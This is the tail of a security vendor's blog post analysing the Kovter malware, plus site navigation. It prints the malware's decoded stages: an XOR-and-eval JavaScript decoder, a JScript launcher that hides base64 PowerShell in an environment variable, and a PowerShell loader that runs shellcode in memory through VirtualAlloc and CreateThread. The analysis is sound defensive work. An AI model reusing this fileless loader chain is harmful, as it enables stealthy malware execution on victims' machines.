+<pre>EncipheredPayload = "7F62342526...Snip...15244427C";
+Key = "03zLOEZm19bJMl14uMp0R7lkGXegNgbSpZxXMtk19HMznwMMbLhAJf1VAoqQARq2txJ7gNlzNl8RPkqFSzsk40n";
+DecipheredPayload = "";
+
+IntermediatePayload = "";
+for (i = 0; i &lt; EncipheredPayload.length; i += 2) IntermediatePayload += String.fromCharCode(parseInt(EncipheredPayload.substr(i, 2), 16));
+
+for (i = j = 0; j &lt; IntermediatePayload.length; j++) {
+    DecipheredPayload += String.fromCharCode(IntermediatePayload.substr(j, 1).charCodeAt() ^ Key.substr(i, 1).charCodeAt());
+    i = (i &lt; Key.length - 1) ? i + 1 : 0;
+}
+
+eval(DecipheredPayload);
+</pre>
+<p>In essence this code takes a string of hex values, converts the hex to ascii and then XORs the resulting string with a key to produce a new javascript. This new javascript is then executed with the eval function.</p>
+<p>The deciphered javascript is:</p>
+<pre>try {
+    moveTo(-100, -100);
+    resizeTo(0, 0);
+    pc60 = new ActiveXObject("WScript.Shell");
+    (pc60.Environment("Process"))("hpmogev") = "iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('c2xlZXAoNDApO3RyeXtmdW5jdGlvbiBnZGVsZWdhdGV7UGFyYW0gKFtQYXJhbWV0ZXIoUG9zaXRpb249MCxNYW5kYXRvcnk9JFRydWUpXSBbVHlwZVtdXSAkUGFyYW1ldGVycyxbUGFyYW1ldGVyKFBvc2l0aW9uPTEpXSBbVHlwZV0gJFJldHVyblR5cGU9W1ZvaWRdKTskVHlwZUJ1aWxkZXI9W0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgiUmVmbGVjdGVkRGVsZWdhdGUiKSksW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKS5EZWZpbmVEeW5hbWljTW9kdWxlKCJJbk1lbW9yeU1vZHVsZSIsJ
+...snip...
+cnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZ3Byb2Mga2VybmVsMzIuZGxsIENyZWF0ZVRocmVhZCksKGdkZWxlZ2F0ZSBAKFtJbnRQdHJdLFtVSW50MzJdLFtCeXRlW11dLFtCeXRlW11dLFtVSW50MzJdLFtJbnRQdHJdKSAoW0ludFB0cl0pKSkpLkludm9rZSgwLDAsJHNjMzIsJHNjMzIsMCwwKTt9c2xlZXAoMTIwMCk7fWNhdGNoe31leGl0Ow==')))";
+    xya6c = pc60.Run("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe iex $env:hpmogev", 0, 1);
+} catch (e) {}
+close();
+
+</pre>
+<p>This takes a base64 encoded payload, decodes it and stores it in an environment variable, again with a random name varying from infection to infection. It then executes powershell and instructs it to load a script from the environment variable.</p>
+<p>The powershell script is:</p>
+<pre>sleep(40);
+try{
+    function gdelegate{
+        Param ([Parameter(Position=0,Mandatory=$True)] [Type[]] $Parameters,[Parameter(Position=1)] [Type] $ReturnType=[Void]);
+        $TypeBuilder=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule",$false).DefineType("XXX","Class,Public,Sealed,AnsiClass,AutoClass",[System.MulticastDelegate]);
+        $TypeBuilder.DefineConstructor("RTSpecialName,HideBySig,Public",[System.Reflection.CallingConventions]::Standard,$Parameters).SetImplementationFlags("Runtime,Managed");
+        $TypeBuilder.DefineMethod("Invoke","Public,HideBySig,NewSlot,Virtual",$ReturnType,$Parameters).SetImplementationFlags("Runtime,Managed");
+        return $TypeBuilder.CreateType();
+        
+    }
+    function gproc{
+        Param ([Parameter(Position=0,Mandatory=$True)] [String] $Module,[Parameter(Position=1,Mandatory=$True)] [String] $Procedure);
+        $SystemAssembly=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{
+            $_.GlobalAssemblyCache -And $_.Location.Split("")[-1].Equals("System.dll")
+        }
+        ;
+        $UnsafeNativeMethods=$SystemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods");
+        return $UnsafeNativeMethods.GetMethod("GetProcAddress").Invoke($null,@([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),$UnsafeNativeMethods.GetMethod("GetModuleHandle").Invoke($null,@($Module)))),$Procedure));
+        
+    }
+    [Byte[]] $sc32 = 0x55,0x8B,0xEC,0x81,0xC4,0x00,0xFA,0xFF,0xFF,0x53,0x56,0x57,0x53,0x56,0x57,0xFC,0x31,0xD2,0x64,0x8B,0x52,0x30,0x8B,0x52,0x0C,0x8B,0x52,0x14,0x8B,0x72,0x28,0x6A,0x18,0x59,0x31,0xFF,0x31,0xC0,0xAC,0x3C,0x61,0x7C,0x02,0x2C,0x20,0xC1,0xCF,0x0D,0x01,0xC7,0xE2,0xF0,0x81,0xFF,0x5B,0xBC,0x4A,0x6A,0x8B,0x5A,0x10,0x8B,0x12,0x75,0xDB,0x89,0x5D,0xFC,0x5F,0x5E,0x5B,0x8B,0x45,0xFC,0x89,0x45,0xD4,0x8B,0x45,0xD4,0x66,0x81,0
+...snip...
+B,0x75,0x0C,0x8B,0x4D,0x10,0xF3,0xA4,0x61,0x5D,0xC2,0x0C,0x00,0xBD,0xDD,0x50,0x1A,0xE0,0xAD,0x75,0x5F,0xA5,0x2D,0x33,0x04,0x3B,0x01,0x10,0x05,0xE6,0xE7,0x8A,0x6C,0xA1,0x4A,0x1C,0x71,0x5C,0xF0,0xEC,0xD2,0x78,0xE2,0x60,0x9D,0x60,0xBD,0x0A,0xCB,0x50,0x18,0xB4,0x68,0xAD,0xAD,0x80,0x1E,0x8F,0x6F,0x5C,0x65,0x4C;
+    [Uint32[]] $op=0;
+    $r=([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll VirtualProtect),(gdelegate @([Byte[]],[UInt32],[UInt32],[UInt32[]]) ([IntPtr])))).Invoke($sc32,$sc32.Length,0x40,$op);
+    if($r -eq 0){
+        $pr=([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll VirtualAlloc),(gdelegate @([IntPtr],[UInt32],[UInt32],[UInt32]) ([UInt32])))).Invoke(0,$sc32.Length,0x3000,0x40);
+        if($pr -ne 0){
+            $memset=([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc msvcrt.dll memset),(gdelegate @([UInt32],[UInt32],[UInt32]) ([IntPtr]))));
+            for ($i=0;
+            $i -le ($sc32.Length-1);
+            $i++) {
+                $memset.Invoke(($pr+$i), $sc32[$i], 1)
+            }
+            ;
+            ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread),(gdelegate @([IntPtr],[UInt32],[UInt32],[UInt32],[UInt32],[IntPtr]) ([IntPtr])))).Invoke(0,0,$pr,$pr,0,0);
+            
+        }
+        
+    }
+    else{
+        ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread),(gdelegate @([IntPtr],[UInt32],[Byte[]],[Byte[]],[UInt32],[IntPtr]) ([IntPtr])))).Invoke(0,0,$sc32,$sc32,0,0);
+        
+    }
+    sleep(1200);
+    
+}
+catch{
+    
+}
+exit;
+</pre>
+<p>This script essentially creates a custom library function import routine to load VirtualProtect, VirtualAlloc and CreateThread from kernel32.dll as well as memset from msvcrt.dll. It then uses these functions to allocate a region of executable memory, copy a hex encoded shellcode into that location and then execute it in a new thread. This new thread then goes on to spawn the first regsvr32.exe process.</p>
+<h3>Conclusions</h3>
+<p>Kovter is able to conceal itself in the registry and maintain persistence through the use of several concealed run keys. Aside from the initial infecting executable, which may or may not touch the disk, and which is deleted following infection, there should be very few file system artefacts to find. Powershell does not maintain a log of commands, and the environment variable is lost after the Powershell process exits so there is very little chance of recovering the script executed and the final payload without following an RE process.</p>
+</div></body></html>
+                                            <div class="row">
+                            <div class="col-sm-12">
+ <section class="page">
+            </section>
+</div>
+
+                        </div>
+                                        
+                    
+                                            <a class="button mt-3 mb-3" href="https://airbus-cyber-security.com/blog">Back to Blog</a>
+                    
+                    
+                    
+                                    </section>
+                    </div>
+    </div>
+</div>
+      </main><!-- /.main -->
+              <aside class="sidebar">
+           
+            
+        
+<aside class="contact">
+    <header>
+        <a href="#" data-toggle="modal" data-target="#demo"><h5>Contact Us <img src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/email-white.svg"></h5></a>
+    </header>
+</aside>
+
+    <aside class="news">
+        <header>
+            <h5>Latest News</h5>
+        </header>
+        <main>
+            <ul>
+                <li><a href="https://airbus-cyber-security.com/news/airbus-cybersecurity-and-claroty-partner-to-secure-manufacturing-environments/">Collaboration Incorporates Airbus CyberSecurity&rsquo;s Security Operations Centre 4.0 Managed Security Services with Claroty&rsquo;s Industrial Cybersecurity Platform Airbus CyberSecurity and...</a></li><li><a href="https://airbus-cyber-security.com/news/a-guide-to-supply-chain-compromises-dont-let-your-supply-chain-be-the-chink-in-your-cyber-armour/">by Airbus CyberSecurity&rsquo;s Cyber Threat Intelligence (CTI) Team As a result of the recent SolarWinds campaign, supply-chain compromises are...</a></li><li><a href="https://airbus-cyber-security.com/news/healthcare-a-complex-industry-with-the-need-for-cyber-security/">by Fernando&nbsp;Guerrero B.,&nbsp;OT Security Expert Today more than ever, the healthcare industry is on the road to real digital...</a></li>            </ul>
+        </main>
+</aside>
+
+
+<div class="modal fade" id="demo" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="myModalLabel">Contact Us</h4>
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+            </div>
+            <div class="modal-body">
+
+                 
+                <div class="contact-form">
+                <script>
+                hbspt.forms.create({
+                    portalId: "3786665",
+                    formId: "c824a424-8d4b-4803-9238-c840db45b3b2",
+                    submitButtonClass: 'button mt-3',
+                    css: ''
+                });
+                </script>
+                </div>
+
+                
+        </div>
+    </div>
+</div>        </aside><!-- /.sidebar -->
+            </div>
+    </div><!-- /.content -->
+  </div><!-- /.wrap -->
+<footer class="dark-blue">
+  <div class="container">
+    <nav class="nav-footer-one">
+      <h5>Site Map</h5>
+      <div class="menu-footer-one-container"><ul id="menu-footer-one" class="nav"><li id="menu-item-78" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-78"><a href="https://airbus-cyber-security.com/industries/">Industries</a></li>
+<li id="menu-item-77" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-77"><a href="https://airbus-cyber-security.com/products-and-services/">Products &#038; Services</a></li>
+<li id="menu-item-76" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-76"><a href="https://airbus-cyber-security.com/about/">About Us</a></li>
+<li id="menu-item-79" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-79"><a href="https://airbus-cyber-security.com/news-and-events/">News &#038; Events</a></li>
+<li id="menu-item-1977" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1977"><a href="https://airbus-cyber-security.com/resources/">Resources</a></li>
+<li id="menu-item-259" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-259"><a href="https://airbus-cyber-security.com/blog/">Blog</a></li>
+<li id="menu-item-80" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-80"><a href="https://airbus-cyber-security.com/contact-us/">Contact Us</a></li>
+</ul></div>    </nav>
+
+    <nav class="nav-footer-two">
+      <h5>Useful Links</h5>
+      <div class="menu-footer-two-container"><ul id="menu-footer-two" class="nav"><li id="menu-item-82" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-82"><a target="_blank" rel="noopener noreferrer" href="http://www.airbus.com/">Airbus</a></li>
+<li id="menu-item-81" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81"><a target="_blank" rel="noopener noreferrer" href="https://www.stormshield.com">Stormshield</a></li>
+<li id="menu-item-2197" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2197"><a href="https://airbus-cyber-security.com/conditions-of-purchase/">Conditions of purchase</a></li>
+</ul></div>    </nav>
+
+    <nav class="nav-footer-three">
+      <h5>Careers</h5>
+      <div class="menu-footer-three-container"><ul id="menu-footer-three" class="nav"><li id="menu-item-4182" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4182"><a href="https://airbus-cyber-security.com/cyber-security-jobs-careers/">Jobs &#038; Careers</a></li>
+</ul></div>    </nav>
+        <ul class="social">
+            <li><a target="_blank" aria-label="Twitter" rel="noopner noreferrer" href="https://twitter.com/AirbusCyber"><img alt="Twitter" src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/twitter-white.svg"></a></li>
+                <li><a target="_blank" aria-label="Linkedin" rel="noopner noreferrer" href="http://www.linkedin.com/company/AirbusCyber"><img alt="Linkedin" src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/linkedin-white.svg"></a></li>
+                <li><a href="https://airbus-cyber-security.com/contact-us" aria-label="Contact"><img alt="contact" src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/contact-white.svg"></a></li>
+    </ul>  </div>
+</footer><footer class="black">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12 col-lg-6">
+                  <a href="https://airbus-cyber-security.com/terms-of-use">Terms of use</a>
+          <a href="https://airbus-cyber-security.com/privacy-policy">Privacy Policy</a>
+              </div>
+      <div class="col-md-12 col-lg-6">
+        <span class="copy">
+          &copy; Airbus 2021        </span>
+      </div>
+    </div>
+  </div>
+</footer><script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/jquery.matchHeight/0.7.2/jquery.matchHeight-min.js' id='match-height-js'></script>
+<script type='text/javascript' src='https://airbus-cyber-security.com/wp-content/themes/airbus/dist/scripts/bxslider.min.js' id='bx-slider-js'></script>
+<script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js' id='poper-js-js'></script>
+<script type='text/javascript' src='https://cdn.jsdelivr.net/jquery.cookie/1.4.1/jquery.cookie.min.js' id='cookie-js-js'></script>
+<script type='text/javascript' src='//cdnjs.cloudflare.com/ajax/libs/jquery.lazy/1.7.6/jquery.lazy.min.js' id='lazy-load-js'></script>
+<script type='text/javascript' src='https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js' id='magnific-popup-js'></script>
+<script type='text/javascript' src='https://airbus-cyber-security.com/wp-content/themes/airbus/dist/scripts/main.js' id='sage/js-js'></script>
+<script type='text/javascript' src='https://airbus-cyber-security.com/wp-includes/js/wp-embed.min.js?ver=5.5.5' id='wp-embed-js'></script>
+<!-- Start of HubSpot Embed Code -->
+<!-- <script type="text/javascript" id="hs-script-loader" async defer src="//js.hs-scripts.com/3786665.js"></script> -->
+<!-- End of HubSpot Embed Code -->
+
+<script type="text/javascript">
+_linkedin_partner_id = "3476401";
+window._linkedin_data_partner_ids = window._linkedin_data_partner_ids || [];
+window._linkedin_data_partner_ids.push(_linkedin_partner_id);
+</script><script type="text/javascript">
+(function(){var s = document.getElementsByTagName("script")[0];
+var b = document.createElement("script");
+b.type = "text/javascript";b.async = true;
+b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
+s.parentNode.insertBefore(b, s);})();
+</script>
+<noscript>
+<img height="1" width="1" style="display:none;" alt="" src="https://px.ads.linkedin.com/collect/?pid=3476401&fmt=gif" />
+</noscript>
+
+</body>
+</html>
